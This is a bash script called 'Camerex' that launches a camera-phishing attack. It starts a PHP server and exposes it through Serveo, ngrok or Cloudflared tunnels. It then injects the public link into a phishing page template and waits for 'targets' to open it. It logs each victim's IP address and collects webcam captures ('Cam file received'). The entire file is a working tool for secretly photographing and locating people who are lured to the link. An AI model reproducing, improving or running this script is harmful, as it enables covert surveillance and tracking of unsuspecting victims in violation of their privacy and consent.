#!/bin/bash
# Camerex v1.0
# coded by: REX HACK | Organization: Voidsec Org
# If you use any part from this code, giving me the credits. Read the License!

trap 'printf "\n";stop' 2

banner() {
    printf "\e[1;92m  ____                          \e[0m\e[1;77m _____                           \e[0m\n"
    printf "\e[1;92m / ___|__ _  __ _  ___  ___ _ __\e[0m\e[1;77m| ____|_ __ _ __ ___  _ __ ___   \e[0m\n"
    printf "\e[1;92m| |   / _\` |/ _\` |/ _ \\/ _ \\ '__\e[0m\e[1;77m|  _| | '__| '__/ _ \\| '__/ __| \e[0m\n"
    printf "\e[1;92m| |__| (_| | (_| |  __/  __/ |  \e[0m\e[1;77m| |___| |  | | | (_) | |  \\__ \\ \e[0m\n"
    printf "\e[1;92m \\____\\__,_|\\__, |\\___|\\___|_|  \e[0m\e[1;77m|_____|_|  |_|  \\___/|_|  |___/ \e[0m\n"
    printf "\e[1;92m            |___/               \e[0m                                       \n"
    printf " \e[1;77m v2.0 coded by REX HACK | Organization: VOIDSEC ORG\e[0m \n"
    printf "\n"
}

stop() {
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)
    
    if [[ $checkngrok == *'ngrok'* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
    fi

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    
    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi

    if [[ $checkcloudflared == *'cloudflared'* ]]; then
        pkill -f -2 cloudflared > /dev/null 2>&1
        killall -2 cloudflared > /dev/null 2>&1
    fi
    
    # Clean up temporary files
    rm -f sendlink server.log ngrok.log cloudflared.log 2>/dev/null
    exit 1
}

dependencies() {
    local missing_deps=()
    
    command -v php > /dev/null 2>&1 || missing_deps+=("php")
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        printf "\e[1;91m[!] Missing dependencies: %s\n" "${missing_deps[*]}"
        printf "Please install them and try again.\e[0m\n"
        exit 1
    fi
}

catch_ip() {
    if [[ -f "ip.txt" ]]; then
        ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
        IFS=$'\n'
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
        
        if [[ -f "saved.ip.txt" ]]; then
            cat ip.txt >> saved.ip.txt
        else
            cp ip.txt saved.ip.txt
        fi
        
        rm -f ip.txt
    fi
}

checkfound() {
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
    
    while true; do
        if [[ -f "ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
            catch_ip
        fi

        if [[ -f "Log.log" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
            rm -f Log.log
        fi
        
        sleep 0.5
    done
}

wait_for_serveo() {
    local max_attempts=30
    local attempt=0
    
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Waiting for Serveo connection...\e[0m\n"
    
    while [ $attempt -lt $max_attempts ]; do
        if [[ -f "sendlink" ]]; then
            send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink 2>/dev/null)
            if [[ -n "$send_link" ]]; then
                printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' "$send_link"
                return 0
            fi
        fi
        
        # Check if SSH process is still running
        if ! ps -p $! > /dev/null 2>&1; then
            printf "\e[1;91m[!] Serveo connection failed!\n"
            printf "Trying Cloudflared as fallback...\e[0m\n"
            return 1
        fi
        
        sleep 2
        attempt=$((attempt + 1))
    done
    
    printf "\e[1;91m[!] Serveo connection timeout! Trying Cloudflared...\e[0m\n"
    return 1
}

install_cloudflared() {
    printf "\e[1;92m[\e[0m+\e[1;92m] Installing Cloudflared...\n"
    
    arch=$(uname -m)
    os=$(uname -s | tr '[:upper:]' '[:lower:]')
    
    if [[ $arch == *"arm"* ]] || [[ $arch == *"Android"* ]]; then
        # ARM architecture (Termux)
        wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
    elif [[ $arch == *"aarch64"* ]]; then
        # ARM64 architecture
        wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
    elif [[ $arch == *"x86_64"* ]]; then
        # x86_64 architecture
        wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
    else
        # 32-bit architecture
        wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
    fi

    if [[ -e cloudflared ]]; then
        chmod +x cloudflared
        printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflared installed successfully!\e[0m\n"
        return 0
    else
        printf "\e[1;91m[!] Cloudflared installation failed!\e[0m\n"
        return 1
    fi
}

cloudflared_server() {
    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Cloudflared...\e[0m\n"
    
    # Install cloudflared if not present
    if [[ ! -e cloudflared ]]; then
        if ! install_cloudflared; then
            printf "\e[1;91m[!] Failed to install Cloudflared. Exiting.\e[0m\n"
            return 1
        fi
    fi

    # Kill any existing PHP servers
    if pgrep -x "php" > /dev/null; then
        killall -2 php > /dev/null 2>&1
        sleep 2
    fi

    # Start PHP server
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting PHP server... (localhost:3333)\e[0m\n"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 2

    # Verify PHP server is running
    if ! pgrep -x "php" > /dev/null; then
        printf "\e[1;91m[!] Failed to start PHP server on port 3333\e[0m\n"
        return 1
    fi

    # Start Cloudflared tunnel
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting Cloudflared tunnel...\e[0m\n"
    ./cloudflared tunnel -url localhost:3333 --logfile cloudflared.log > /dev/null 2>&1 &
    sleep 10

    # Get Cloudflared link
    cloudflared_link=$(grep -o 'https://[0-9a-z]*\.trycloudflare.com' cloudflared.log | head -n1)

    if [[ -n "$cloudflared_link" ]]; then
        printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Cloudflared Direct link:\e[0m\e[1;77m %s\n' "$cloudflared_link"
        
        # Update payload with Cloudflared link
        sed 's+forwarding_link+'$cloudflared_link'+g' saycheese.html > index2.html
        sed 's+forwarding_link+'$cloudflared_link'+g' template.php > index.php
        
        return 0
    else
        printf "\e[1;91m[!] Failed to get Cloudflared link. Check cloudflared.log for details.\e[0m\n"
        return 1
    fi
}

server() {
    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

    # Kill any existing PHP servers
    if pgrep -x "php" > /dev/null; then
        killall -2 php > /dev/null 2>&1
        sleep 2
    fi

    # Clean up previous files
    rm -f sendlink server.log 2>/dev/null

    local ssh_command
    if [[ $subdomain_resp == true ]]; then
        printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Using subdomain: %s\e[0m\n" "$subdomain"
        ssh_command="ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ConnectTimeout=30 -R ${subdomain}:80:localhost:3333 serveo.net 2> server.log > sendlink"
    else
        ssh_command="ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ConnectTimeout=30 -R 80:localhost:3333 serveo.net 2> server.log > sendlink"
    fi

    # Start SSH tunnel in background
    eval "$ssh_command" &
    local ssh_pid=$!

    # Wait for Serveo connection
    if ! wait_for_serveo; then
        kill $ssh_pid 2>/dev/null
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Switching to Cloudflared...\e[0m\n"
        if cloudflared_server; then
            return 0
        else
            printf "\e[1;91m[!] All tunneling services failed!\e[0m\n"
            return 1
        fi
    fi

    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting PHP server... (localhost:3333)\e[0m\n"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    
    sleep 2
    
    # Verify PHP server is running
    if ! pgrep -x "php" > /dev/null; then
        printf "\e[1;91m[!] Failed to start PHP server on port 3333\e[0m\n"
        kill $ssh_pid 2>/dev/null
        return 1
    fi
    
    return 0
}

payload_ngrok() {
    if [[ -n "$link" ]]; then
        sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
        sed 's+forwarding_link+'$link'+g' template.php > index.php
    else
        printf "\e[1;91m[!] No ngrok link found!\e[0m\n"
        return 1
    fi
}

ngrok_server() {
    if [[ ! -e ngrok ]]; then
        command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
        command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
        
        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
        arch=$(uname -a | grep -o 'arm' | head -n1)
        arch2=$(uname -a | grep -o 'Android' | head -n1)
        
        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
            wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
            if [[ -e ngrok-stable-linux-arm.zip ]]; then
                unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-arm.zip
            else
                printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
                exit 1
            fi
        else
            wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
            if [[ -e ngrok-stable-linux-386.zip ]]; then
                unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-386.zip
            else
                printf "\e[1;93m[!] Download error... \e[0m\n"
                exit 1
            fi
        fi
    fi

    printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 3333 > ngrok.log 2>&1 &
    sleep 10

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io" | head -n1)
    
    if [[ -n "$link" ]]; then
        printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
        payload_ngrok
        checkfound
    else
        printf "\e[1;91m[!] Failed to get ngrok link. Trying Cloudflared...\e[0m\n"
        if cloudflared_server; then
            checkfound
        else
            printf "\e[1;91m[!] All tunneling services failed!\e[0m\n"
            exit 1
        fi
    fi
}

start1() {
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi

    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (with Cloudflared fallback)\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok (with Cloudflared fallback)\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflared Only\e[0m\n"
    
    default_option_server="1"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
    option_server="${option_server:-${default_option_server}}"
    
    case $option_server in
        1)
            start
            ;;
        2)
            ngrok_server
            ;;
        3)
            cloudflared_server
            checkfound
            ;;
        *)
            printf "\e[1;93m [!] Invalid option!\e[0m\n"
            sleep 1
            clear
            start1
            ;;
    esac
}

payload() {
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink 2>/dev/null)
    
    if [[ -n "$send_link" ]]; then
        sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
        sed 's+forwarding_link+'$send_link'+g' template.php > index.php
        return 0
    else
        # If Serveo failed but Cloudflared worked, the payload is already set
        if [[ -f "index2.html" ]] && [[ -f "index.php" ]]; then
            return 0
        else
            printf "\e[1;91m[!] No tunnel link found for payload generation!\e[0m\n"
            return 1
        fi
    fi
}

start() {
    default_choose_sub="Y"
    default_subdomain="camerex$RANDOM"

    printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Use custom subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
    read choose_sub
    choose_sub="${choose_sub:-${default_choose_sub}}"
    
    if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
        subdomain_resp=true
        printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' "$default_subdomain"
        read subdomain
        subdomain="${subdomain:-${default_subdomain}}"
    else
        subdomain_resp=false
    fi

    if server; then
        if payload; then
            checkfound
        else
            printf "\e[1;91m[!] Failed to generate payload\e[0m\n"
            stop
        fi
    else
        printf "\e[1;91m[!] Server startup failed\e[0m\n"
        stop
    fi
}

# Main execution
banner
dependencies
start1
